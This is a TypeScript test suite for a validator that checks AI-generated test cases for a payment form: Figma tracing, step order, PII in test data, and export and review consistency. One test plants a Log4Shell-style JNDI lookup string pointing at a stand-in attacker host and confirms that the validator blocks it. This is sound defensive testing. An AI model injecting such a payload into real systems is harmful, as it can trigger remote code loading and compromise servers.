import assert from "node:assert/strict";
import test from "node:test";
import {
  GENERATED_TEST_CASE_SCHEMA_VERSION,
  TEST_INTELLIGENCE_CONTRACT_VERSION,
  TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
  type BusinessTestIntentIr,
  type GeneratedTestCase,
  type GeneratedTestCaseList,
} from "../contracts/index.js";
import { validateGeneratedTestCases } from "./test-case-validation.js";

const ZERO_HASH =
  "0000000000000000000000000000000000000000000000000000000000000000";
const GENERATED_AT = "2026-04-25T10:00:00.000Z";

const buildIntent = (): BusinessTestIntentIr => ({
  version: "1.0.0",
  source: { kind: "figma_local_json", contentHash: ZERO_HASH },
  screens: [
    {
      screenId: "s-payment",
      screenName: "Payment Details",
      trace: { nodeId: "s-payment" },
    },
  ],
  detectedFields: [
    {
      id: "s-payment::field::n-iban",
      screenId: "s-payment",
      trace: { nodeId: "n-iban" },
      provenance: "figma_node",
      confidence: 0.9,
      label: "IBAN",
      type: "text",
    },
  ],
  detectedActions: [
    {
      id: "s-payment::action::n-submit",
      screenId: "s-payment",
      trace: { nodeId: "n-submit" },
      provenance: "figma_node",
      confidence: 0.9,
      label: "Pay",
      kind: "button",
    },
  ],
  detectedValidations: [
    {
      id: "s-payment::validation::n-iban::Required",
      screenId: "s-payment",
      trace: { nodeId: "n-iban" },
      provenance: "figma_node",
      confidence: 0.85,
      rule: "Required",
      targetFieldId: "s-payment::field::n-iban",
    },
  ],
  detectedNavigation: [],
  inferredBusinessObjects: [],
  risks: [],
  assumptions: [],
  openQuestions: [],
  piiIndicators: [],
  redactions: [],
});

const buildCase = (
  overrides: Partial<GeneratedTestCase> = {},
): GeneratedTestCase => ({
  id: "tc-1",
  sourceJobId: "job-1",
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
  promptTemplateVersion: TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
  title: "Pay with valid IBAN",
  objective: "Submit the payment form with a valid IBAN",
  level: "system",
  type: "functional",
  priority: "p1",
  riskCategory: "financial_transaction",
  technique: "use_case",
  preconditions: [],
  testData: ["[REDACTED:IBAN]"],
  steps: [
    { index: 1, action: "Open payment screen" },
    { index: 2, action: "Submit form", expected: "Confirmation displayed" },
  ],
  expectedResults: ["Confirmation displayed"],
  figmaTraceRefs: [{ screenId: "s-payment" }],
  assumptions: [],
  openQuestions: [],
  qcMappingPreview: { exportable: true },
  qualitySignals: {
    coveredFieldIds: ["s-payment::field::n-iban"],
    coveredActionIds: ["s-payment::action::n-submit"],
    coveredValidationIds: [],
    coveredNavigationIds: [],
    confidence: 0.85,
  },
  reviewState: "draft",
  audit: {
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
    schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
    promptTemplateVersion: TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
    redactionPolicyVersion: "1.0.0",
    visualSidecarSchemaVersion: "1.0.0",
    cacheHit: false,
    cacheKey: "k",
    inputHash: ZERO_HASH,
    promptHash: ZERO_HASH,
    schemaHash: ZERO_HASH,
  },
  ...overrides,
});

const buildList = (
  cases: GeneratedTestCase[] = [buildCase()],
): GeneratedTestCaseList => ({
  schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
  jobId: "job-1",
  testCases: cases,
});

test("valid input produces a clean report", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList(),
    intent: buildIntent(),
  });
  assert.equal(report.errorCount, 0, JSON.stringify(report.issues, null, 2));
  assert.equal(report.warningCount, 0);
  assert.equal(report.blocked, false);
  assert.equal(report.totalTestCases, 1);
});

test("structural schema failures short-circuit semantic checks", () => {
  const list = { schemaVersion: "wrong", jobId: "", testCases: "not-array" };
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: list as unknown as GeneratedTestCaseList,
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.length >= 2);
  assert.ok(report.issues.every((i) => i.code === "schema_invalid"));
});

test("missing trace is blocking", () => {
  const tc = buildCase({ figmaTraceRefs: [] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  const codes = report.issues.map((i) => i.code);
  assert.ok(codes.includes("missing_trace"));
});

test("trace screen unknown is blocking", () => {
  const tc = buildCase({ figmaTraceRefs: [{ screenId: "s-other" }] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "trace_screen_unknown"));
});

test("missing expected results is blocking", () => {
  const tc = buildCase({
    expectedResults: [],
    steps: [
      { index: 1, action: "Open payment screen" },
      { index: 2, action: "Submit form" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "missing_expected_results"));
});

test("expected results may live on a step", () => {
  const tc = buildCase({
    expectedResults: [],
    steps: [
      { index: 1, action: "Open" },
      { index: 2, action: "Submit", expected: "Receipt rendered" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, false);
});

test("PII in test data is blocking even when value looks innocuous", () => {
  const tc = buildCase({ testData: ["jane.doe@example.com"] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "test_data_pii_detected"));
});

test("redaction tokens in test data are accepted", () => {
  const tc = buildCase({
    testData: ["[REDACTED:IBAN]", "[REDACTED:EMAIL]"],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, false);
});

test("semantic suspicious content in exported step data is blocking", () => {
  const tc = buildCase({
    steps: [
      {
        index: 1,
        action: "Open payment screen",
        data: "${jndi:ldap://attacker.example/a}",
        expected: "Form is visible",
      },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some(
      (i) =>
        i.code === "semantic_suspicious_content" &&
        i.path === "$.testCases[0].steps[0].data",
    ),
  );
});

test("PII in preconditions is blocking", () => {
  const tc = buildCase({ preconditions: ["Use IBAN DE89370400440532013000"] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "preconditions_pii_detected"));
});

test("steps must be ordered and sequential", () => {
  const tc = buildCase({
    steps: [
      { index: 2, action: "Submit" },
      { index: 1, action: "Open" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  const codes = report.issues.map((i) => i.code);
  assert.ok(codes.includes("steps_unordered"));
});

test("step indices must form contiguous 1..N", () => {
  const tc = buildCase({
    steps: [
      { index: 1, action: "Open" },
      { index: 3, action: "Submit", expected: "OK" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "steps_indices_non_sequential"),
  );
});

test("duplicate step index is reported", () => {
  const tc = buildCase({
    steps: [
      { index: 1, action: "Open" },
      { index: 1, action: "Submit", expected: "OK" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "duplicate_step_index"));
});

test("qc mapping with exportable=false requires blocking reasons", () => {
  const tc = buildCase({
    qcMappingPreview: { exportable: false },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "qc_mapping_blocking_reasons_missing"),
  );
});

test("qc mapping exportable=true with blocking reasons is inconsistent", () => {
  const tc = buildCase({
    qcMappingPreview: {
      exportable: true,
      blockingReasons: ["leftover from a prior run"],
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "qc_mapping_exportable_inconsistent"),
  );
});

test("ambiguity with auto_approved review state is rejected", () => {
  const tc = buildCase({
    reviewState: "auto_approved",
    qualitySignals: {
      coveredFieldIds: [],
      coveredActionIds: [],
      coveredValidationIds: [],
      coveredNavigationIds: [],
      confidence: 0.9,
      ambiguity: { reason: "visual disagreed with figma label" },
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "ambiguity_without_review_state"),
  );
});

test("duplicate test case ids surface as errors", () => {
  const a = buildCase({ id: "tc-1" });
  const b = buildCase({ id: "tc-1" });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([a, b]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "duplicate_test_case_id"));
});

test("coverage ids that reference unknown intent ids surface as warnings", () => {
  const tc = buildCase({
    qualitySignals: {
      coveredFieldIds: ["s-payment::field::n-unknown"],
      coveredActionIds: [],
      coveredValidationIds: [],
      coveredNavigationIds: [],
      confidence: 0.8,
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, false);
  assert.equal(report.warningCount, 1);
  assert.equal(report.issues[0]?.code, "quality_signals_coverage_unknown_id");
});

test("report carries deterministic shape stamps", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList(),
    intent: buildIntent(),
  });
  assert.equal(report.schemaVersion, "1.0.0");
  assert.equal(report.contractVersion, TEST_INTELLIGENCE_CONTRACT_VERSION);
  assert.equal(report.jobId, "job-1");
  assert.equal(report.generatedAt, GENERATED_AT);
});
